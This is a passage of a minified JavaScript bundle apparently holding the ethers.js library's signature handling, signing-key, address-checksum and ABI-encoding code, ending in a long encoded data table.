ti(ml,u,ue(h),d)}if(l.length===65){const u=ue(l.slice(0,32)),h=l.slice(32,64);r((h[0]&128)===0,"non-canonical s");const d=ti.getNormalizedV(l[64]);return new ti(ml,u,ue(h),d)}r(!1,"invalid raw signature length")}if(e instanceof ti)return e.clone();const n=e.r;r(n!=null,"missing r");const i=c6(n),s=function(l,u){if(l!=null)return c6(l);if(u!=null){r(gt(u,32),"invalid yParityAndS");const h=Ve(u);return h[0]&=127,ue(h)}r(!1,"missing s")}(e.s,e.yParityAndS);r((Ve(s)[0]&128)==0,"non-canonical s");const{networkV:o,v:a}=function(l,u,h){if(l!=null){const d=ge(l);return{networkV:d>=A0?d:void 0,v:ti.getNormalizedV(d)}}if(u!=null)return r(gt(u,32),"invalid yParityAndS"),{v:Ve(u)[0]&128?28:27};if(h!=null){switch(Re(h,"sig.yParity")){case 0:return{v:27};case 1:return{v:28}}r(!1,"invalid yParity")}r(!1,"missing v")}(e.v,e.yParityAndS,e.yParity),c=new ti(ml,i,s,a);return o&&$(c,Za,o),r(e.yParity==null||Re(e.yParity,"sig.yParity")===c.yParity,"yParity mismatch"),r(e.yParityAndS==null||e.yParityAndS===c.yParityAndS,"yParityAndS mismatch"),c}};iu=new WeakMap,su=new WeakMap,ou=new WeakMap,Za=new WeakMap;let fi=ti;var As;const Oa=class Oa{constructor(e){H(this,As);M(Wl(e)===32,"invalid private key","privateKey","[REDACTED]"),$(this,As,ue(e))}get privateKey(){return A(this,As)}get publicKey(){return Oa.computePublicKey(A(this,As))}get compressedPublicKey(){return Oa.computePublicKey(A(this,As),!0)}sign(e){M(Wl(e)===32,"invalid digest length","digest",e);const r=ao.sign(xr(e),xr(A(this,As)),{lowS:!0});return fi.from({r:qo(r.r,32),s:qo(r.s,32),v:r.recovery?28:27})}computeSharedSecret(e){const r=Oa.computePublicKey(e);return ue(ao.getSharedSecret(xr(A(this,As)),Ve(r),!1))}static computePublicKey(e,r){let n=Ve(e,"key");if(n.length===32){const s=ao.getPublicKey(n,!!r);return ue(s)}if(n.length===64){const s=new Uint8Array(65);s[0]=4,s.set(n,1),n=s}const i=ao.ProjectivePoint.fromHex(n);return ue(i.toRawBytes(r))}static recoverPublicKey(e,r){M(Wl(e)===32,"invalid digest length","digest",e);const n=fi.from(r);let i=ao.Signature.fromCompact(xr(Ot([n.r,n.s])));i=i.addRecoveryBit(n.yParity);const s=i.recoverPublicKey(xr(e));return M(s!=null,"invalid signature for digest","signature",r),"0x"+s.toHex(!1)}static addPoints(e,r,n){const i=ao.ProjectivePoint.fromHex(Oa.computePublicKey(e).substring(2)),s=ao.ProjectivePoint.fromHex(Oa.computePublicKey(r).substring(2));return"0x"+i.add(s).toHex(!!n)}};As=new WeakMap;let mf=Oa;const uee=BigInt(0),hee=BigInt(36);function l6(t){t=t.toLowerCase();const e=t.substring(2).split(""),r=new Uint8Array(40);for(let i=0;i<40;i++)r[i]=e[i].charCodeAt(0);const n=Ve($t(r));for(let i=0;i<40;i+=2)n[i>>1]>>4>=8&&(e[i]=e[i].toUpperCase()),(n[i>>1]&15)>=8&&(e[i+1]=e[i+1].toUpperCase());return"0x"+e.join("")}const D2={};for(let t=0;t<10;t++)D2[String(t)]=String(t);for(let t=0;t<26;t++)D2[String.fromCharCode(65+t)]=String(10+t);const u6=15;function dee(t){t=t.toUpperCase(),t=t.substring(4)+t.substring(0,2)+"00";let e=t.split("").map(n=>D2[n]).join("");for(;e.length>=u6;){let n=e.substring(0,u6);e=parseInt(n,10)%97+e.substring(n.length)}let r=String(98-parseInt(e,10)%97);for(;r.length<2;)r="0"+r;return r}const fee=function(){const t={};for(let e=0;e<36;e++){const r="0123456789abcdefghijklmnopqrstuvwxyz"[e];t[r]=BigInt(e)}return t}();function pee(t){t=t.toLowerCase();let e=uee;for(let r=0;r<t.length;r++)e=e*hee+fee[t[r]];return e}function ot(t){if(M(typeof t=="string","invalid address","address",t),t.match(/^(0x)?[0-9a-fA-F]{40}$/)){t.startsWith("0x")||(t="0x"+t);const e=l6(t);return M(!t.match(/([A-F].*[a-f])|([a-f].*[A-F])/)||e===t,"bad address checksum","address",t),e}if(t.match(/^XE[0-9]{2}[0-9A-Za-z]{30,31}$/)){M(t.substring(2,4)===dee(t),"bad icap checksum","address",t);let e=pee(t.substring(4)).toString(16);for(;e.length<40;)e="0"+e;return l6("0x"+e)}M(!1,"invalid address","address",t)}function gee(t){const e=ot(t.from);let n=ge(t.nonce,"tx.nonce").toString(16);return n==="0"?n="0x":n.length%2?n="0x0"+n:n="0x"+n,ot(Ct($t(Oc([e,n])),12))}function Ux(t){return t&&typeof t.getAddress=="function"}async function Sm(t,e){const r=await e;return(r==null||r==="0x0000000000000000000000000000000000000000")&&(K(typeof t!="string","unconfigured name","UNCONFIGURED_NAME",{value:t}),M(!1,"invalid AddressLike value; did not resolve to a value address","target",t)),ot(r)}function Nr(t,e){if(typeof t=="string")return t.match(/^0x[0-9a-f]{40}$/i)?ot(t):(K(e!=null,"ENS resolution requires a provider","UNSUPPORTED_OPERATION",{operation:"resolveName"}),Sm(t,e.resolveName(t)));if(Ux(t))return Sm(t,t.getAddress());if(t&&typeof t.then=="function")return Sm(t,t);M(!1,"unsupported addressable value","target",t)}const ps={};function ce(t,e){let r=!1;return e<0&&(r=!0,e*=-1),new mr(ps,`${r?"":"u"}int${e}`,t,{signed:r,width:e})}function Ke(t,e){return new mr(ps,`bytes${e||""}`,t,{size:e})}const h6=Symbol.for("_ethers_typed");var Ja;const gs=class gs{constructor(e,r,n,i){j(this,"type");j(this,"value");H(this,Ja);j(this,"_typedSymbol");i==null&&(i=null),sp(ps,e,"Typed"),Ce(this,{_typedSymbol:h6,type:r,value:n}),$(this,Ja,i),this.format()}format(){if(this.type==="array")throw new Error("");if(this.type==="dynamicArray")throw new Error("");return this.type==="tuple"?`tuple(${this.value.map(e=>e.format()).join(",")})`:this.type}defaultValue(){return 0}minValue(){return 0}maxValue(){return 0}isBigInt(){return!!this.type.match(/^u?int[0-9]+$/)}isData(){return this.type.startsWith("bytes")}isString(){return this.type==="string"}get tupleName(){if(this.type!=="tuple")throw TypeError("not a tuple");return A(this,Ja)}get arrayLength(){if(this.type!=="array")throw TypeError("not an array");return A(this,Ja)===!0?-1:A(this,Ja)===!1?this.value.length:null}static from(e,r){return new gs(ps,e,r)}static uint8(e){return ce(e,8)}static uint16(e){return ce(e,16)}static uint24(e){return ce(e,24)}static uint32(e){return ce(e,32)}static uint40(e){return ce(e,40)}static uint48(e){return ce(e,48)}static uint56(e){return ce(e,56)}static uint64(e){return ce(e,64)}static uint72(e){return ce(e,72)}static uint80(e){return ce(e,80)}static uint88(e){return ce(e,88)}static uint96(e){return ce(e,96)}static uint104(e){return ce(e,104)}static uint112(e){return ce(e,112)}static uint120(e){return ce(e,120)}static uint128(e){return ce(e,128)}static uint136(e){return ce(e,136)}static uint144(e){return ce(e,144)}static uint152(e){return ce(e,152)}static uint160(e){return ce(e,160)}static uint168(e){return ce(e,168)}static uint176(e){return ce(e,176)}static uint184(e){return ce(e,184)}static uint192(e){return ce(e,192)}static uint200(e){return ce(e,200)}static uint208(e){return ce(e,208)}static uint216(e){return ce(e,216)}static uint224(e){return ce(e,224)}static uint232(e){return ce(e,232)}static uint240(e){return ce(e,240)}static uint248(e){return ce(e,248)}static uint256(e){return ce(e,256)}static uint(e){return ce(e,256)}static int8(e){return ce(e,-8)}static int16(e){return ce(e,-16)}static int24(e){return ce(e,-24)}static int32(e){return ce(e,-32)}static int40(e){return ce(e,-40)}static int48(e){return ce(e,-48)}static int56(e){return ce(e,-56)}static int64(e){return ce(e,-64)}static int72(e){return ce(e,-72)}static int80(e){return ce(e,-80)}static int88(e){return ce(e,-88)}static int96(e){return ce(e,-96)}static int104(e){return ce(e,-104)}static int112(e){return ce(e,-112)}static int120(e){return ce(e,-120)}static int128(e){return ce(e,-128)}static int136(e){return ce(e,-136)}static int144(e){return ce(e,-144)}static int152(e){return ce(e,-152)}static int160(e){return ce(e,-160)}static int168(e){return ce(e,-168)}static int176(e){return ce(e,-176)}static int184(e){return ce(e,-184)}static int192(e){return ce(e,-192)}static int200(e){return ce(e,-200)}static int208(e){return ce(e,-208)}static int216(e){return ce(e,-216)}static int224(e){return ce(e,-224)}static int232(e){return ce(e,-232)}static int240(e){return ce(e,-240)}static int248(e){return ce(e,-248)}static int256(e){return ce(e,-256)}static int(e){return ce(e,-256)}static bytes1(e){return Ke(e,1)}static bytes2(e){return Ke(e,2)}static bytes3(e){return Ke(e,3)}static bytes4(e){return Ke(e,4)}static bytes5(e){return Ke(e,5)}static bytes6(e){return Ke(e,6)}static bytes7(e){return Ke(e,7)}static bytes8(e){return Ke(e,8)}static bytes9(e){return Ke(e,9)}static bytes10(e){return Ke(e,10)}static bytes11(e){return Ke(e,11)}static bytes12(e){return Ke(e,12)}static bytes13(e){return Ke(e,13)}static bytes14(e){return Ke(e,14)}static bytes15(e){return Ke(e,15)}static bytes16(e){return Ke(e,16)}static bytes17(e){return Ke(e,17)}static bytes18(e){return Ke(e,18)}static bytes19(e){return Ke(e,19)}static bytes20(e){return Ke(e,20)}static bytes21(e){return Ke(e,21)}static bytes22(e){return Ke(e,22)}static bytes23(e){return Ke(e,23)}static bytes24(e){return Ke(e,24)}static bytes25(e){return Ke(e,25)}static bytes26(e){return Ke(e,26)}static bytes27(e){return Ke(e,27)}static bytes28(e){return Ke(e,28)}static bytes29(e){return Ke(e,29)}static bytes30(e){return Ke(e,30)}static bytes31(e){return Ke(e,31)}static bytes32(e){return Ke(e,32)}static address(e){return new gs(ps,"address",e)}static bool(e){return new gs(ps,"bool",!!e)}static bytes(e){return new gs(ps,"bytes",e)}static string(e){return new gs(ps,"string",e)}static array(e,r){throw new Error("not implemented yet")}static tuple(e,r){throw new Error("not implemented yet")}static overrides(e){return new gs(ps,"overrides",Object.assign({},e))}static isTyped(e){return e&&typeof e=="object"&&"_typedSymbol"in e&&e._typedSymbol===h6}static dereference(e,r){if(gs.isTyped(e)){if(e.type!==r)throw new Error(`invalid type: expecetd ${r}, got ${e.type}`);return e.value}return e}};Ja=new WeakMap;let mr=gs;class wee extends Vs{constructor(e){super("address","address",e,!1)}defaultValue(){return"0x0000000000000000000000000000000000000000"}encode(e,r){let n=mr.dereference(r,"string");try{n=ot(n)}catch(i){return this._throwError(i.message,r)}return e.writeValue(n)}decode(e){return ot(qo(e.readValue(),20))}}class mee extends Vs{constructor(r){super(r.name,r.type,"_",r.dynamic);j(this,"coder");this.coder=r}defaultValue(){return this.coder.defaultValue()}encode(r,n){return this.coder.encode(r,n)}decode(r){return this.coder.decode(r)}}function Mx(t,e,r){let n=[];if(Array.isArray(r))n=r;else if(r&&typeof r=="object"){let c={};n=e.map(l=>{const u=l.localName;return K(u,"cannot encode object for signature with missing names","INVALID_ARGUMENT",{argument:"values",info:{coder:l},value:r}),K(!c[u],"cannot encode object for signature with duplicate names","INVALID_ARGUMENT",{argument:"values",info:{coder:l},value:r}),c[u]=!0,r[u]})}else M(!1,"invalid tuple value","tuple",r);M(e.length===n.length,"types/value length mismatch","tuple",r);let i=new tb,s=new tb,o=[];e.forEach((c,l)=>{let u=n[l];if(c.dynamic){let h=s.length;c.encode(s,u);let d=i.writeUpdatableValue();o.push(f=>{d(f+h)})}else c.encode(i,u)}),o.forEach(c=>{c(i.length)});let a=t.appendWriter(i);return a+=t.appendWriter(s),a}function Fx(t,e){let r=[],n=[],i=t.subReader(0);return e.forEach(s=>{let o=null;if(s.dynamic){let a=t.readIndex(),c=i.subReader(a);try{o=s.decode(c)}catch(l){if(or(l,"BUFFER_OVERRUN"))throw l;o=l,o.baseType=s.name,o.name=s.localName,o.type=s.type}}else try{o=s.decode(t)}catch(a){if(or(a,"BUFFER_OVERRUN"))throw a;o=a,o.baseType=s.name,o.name=s.localName,o.type=s.type}if(o==null)throw new Error("investigate");r.push(o),n.push(s.localName||null)}),Yu.fromItems(r,n)}class yee extends Vs{constructor(r,n,i){const s=r.type+"["+(n>=0?n:"")+"]",o=n===-1||r.dynamic;super("array",s,i,o);j(this,"coder");j(this,"length");Ce(this,{coder:r,length:n})}defaultValue(){const r=this.coder.defaultValue(),n=[];for(let i=0;i<this.length;i++)n.push(r);return n}encode(r,n){const i=mr.dereference(n,"array");Array.isArray(i)||this._throwError("expected array value",i);let s=this.length;s===-1&&(s=i.length,r.writeValue(i.length)),Z9(i.length,s,"coder array"+(this.localName?" "+this.localName:""));let o=[];for(let a=0;a<i.length;a++)o.push(this.coder);return Mx(r,o,i)}decode(r){let n=this.length;n===-1&&(n=r.readIndex(),K(n*Sr<=r.dataLength,"insufficient data length","BUFFER_OVERRUN",{buffer:r.bytes,offset:n*Sr,length:r.dataLength}));let i=[];for(let s=0;s<n;s++)i.push(new mee(this.coder));return Fx(r,i)}}class bee extends Vs{constructor(e){super("bool","bool",e,!1)}defaultValue(){return!1}encode(e,r){const n=mr.dereference(r,"bool");return e.writeValue(n?1:0)}decode(e){return!!e.readValue()}}class zx extends Vs{constructor(e,r){super(e,e,r,!0)}defaultValue(){return"0x"}encode(e,r){r=xr(r);let n=e.writeValue(r.length);return n+=e.writeBytes(r),n}decode(e){return e.readBytes(e.readIndex(),!0)}}class vee extends zx{constructor(e){super("bytes",e)}decode(e){return ue(super.decode(e))}}class Eee extends Vs{constructor(r,n){let i="bytes"+String(r);super(i,i,n,!1);j(this,"size");Ce(this,{size:r},{size:"number"})}defaultValue(){return"0x0000000000000000000000000000000000000000000000000000000000000000".substring(0,2+this.size*2)}encode(r,n){let i=xr(mr.dereference(n,this.type));return i.length!==this.size&&this._throwError("incorrect data length",n),r.writeBytes(i)}decode(r){return ue(r.readBytes(this.size))}}const Cee=new Uint8Array([]);class Aee extends Vs{constructor(e){super("null","",e,!1)}defaultValue(){return null}encode(e,r){return r!=null&&this._throwError("not null",r),e.writeBytes(Cee)}decode(e){return e.readBytes(0),null}}const xee=BigInt(0),Iee=BigInt(1),See=BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");class Nee extends Vs{constructor(r,n,i){const s=(n?"int":"uint")+r*8;super(s,s,i,!1);j(this,"size");j(this,"signed");Ce(this,{size:r,signed:n},{size:"number",signed:"boolean"})}defaultValue(){return 0}encode(r,n){let i=ge(mr.dereference(n,this.type)),s=Ba(See,Sr*8);if(this.signed){let o=Ba(s,this.size*8-1);(i>o||i<-(o+Iee))&&this._throwError("value out-of-bounds",n),i=Y9(i,8*Sr)}else(i<xee||i>Ba(s,this.size*8))&&this._throwError("value out-of-bounds",n);return r.writeValue(i)}decode(r){let n=Ba(r.readValue(),this.size*8);return this.signed&&(n=yg(n,this.size*8)),n}}class Pee extends zx{constructor(e){super("string",e)}defaultValue(){return""}encode(e,r){return super.encode(e,Fs(mr.dereference(r,"string")))}decode(e){return bg(super.decode(e))}}class x0 extends Vs{constructor(r,n){let i=!1;const s=[];r.forEach(a=>{a.dynamic&&(i=!0),s.push(a.type)});const o="tuple("+s.join(",")+")";super("tuple",o,n,i);j(this,"coders");Ce(this,{coders:Object.freeze(r.slice())})}defaultValue(){const r=[];this.coders.forEach(i=>{r.push(i.defaultValue())});const n=this.coders.reduce((i,s)=>{const o=s.localName;return o&&(i[o]||(i[o]=0),i[o]++),i},{});return this.coders.forEach((i,s)=>{let o=i.localName;!o||n[o]!==1||(o==="length"&&(o="_length"),r[o]==null&&(r[o]=r[s]))}),Object.freeze(r)}encode(r,n){const i=mr.dereference(n,"tuple");return Mx(r,this.coders,i)}decode(r){return Fx(r,this.coders)}}function _c(t){return $t(Fs(t))}var kee="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